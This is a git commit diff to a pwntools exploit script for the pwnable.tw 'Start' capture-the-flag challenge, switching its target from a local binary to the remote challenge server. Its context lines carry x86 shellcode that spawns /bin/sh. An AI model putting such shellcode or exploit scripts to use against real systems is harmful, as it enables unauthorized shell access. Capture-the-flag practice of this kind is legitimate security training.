c72a642b2a47e4ba7806f665855a6cffc1dd7dec
frozenkp <csjh21010@gmail.com>
2017-11-20 22:53:39 +0800

    modify hack.py

--- pwnable.tw/Start/hack.py
+++ pwnable.tw/Start/hack.py
@@ -1,9 +1,9 @@
 from pwn import *
 
-r = process('./start')
-#r = remote('chall.pwnable.tw', 10000)
+#r = process('./start')
+r = remote('chall.pwnable.tw', 10000)
 
-raw_input()
+#raw_input()
 
 shell = '\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80'
 
